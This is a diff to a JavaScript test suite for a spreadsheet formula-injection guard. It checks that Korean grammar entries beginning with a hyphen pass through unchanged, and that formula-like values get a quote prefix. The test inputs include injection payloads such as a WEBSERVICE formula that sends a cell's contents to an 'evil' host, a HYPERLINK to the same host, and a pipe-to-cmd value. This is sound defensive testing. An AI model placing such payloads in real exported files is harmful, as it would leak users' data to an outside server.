@@ -21,8 +21,39 @@ describe('formula guard rule (S6)', () => {
     },
   );
 
-  it.each(['-(으)ㄴ', '-는다', '-ㄴ/는', '-(이)다', '- 가', ' -(으)면', '-ᄀ', '-ﾡ'])(
-    'keeps Korean grammar entry %j',
+  it.each([
+    '-(으)ㄴ',
+    '-(으)ㄴ/는',
+    '-아/어요',
+    '-기 때문에',
+    '-는다',
+    '-ㄴ/는',
+    '-(이)다',
+    '- 가',
+    ' -(으)면',
+    '-(으)ㄹ까요?',
+    '-ᄀ',
+    '-ﾡ',
+  ])('keeps Korean grammar entry %j', (value) => {
+    expect(startsLikeFormula(value)).toBe(false);
+    expect(guardFormula(value)).toBe(value);
+  });
+
+  it.each([
+    '-(""&"가"&WEBSERVICE("https://evil/?"&B1))',
+    '-("가"&HYPERLINK("https://evil","x"))',
+    '-가+1',
+    '-가!A1',
+    '-가:나',
+    '-가|cmd',
+    '-(으)ㄴ (adj.)',
+    '-가1',
+  ])('prefixes %j: a formula cannot hide behind a Hangul start', (value) => {
+    expect(guardFormula(value)).toBe(`'${value}`);
+  });
+
+  it.each([' =1', '　=1', '﻿=1'])(
+    'treats only space, tab, CR and LF as leading whitespace: keeps %j',
     (value) => {
       expect(startsLikeFormula(value)).toBe(false);
       expect(guardFormula(value)).toBe(value);
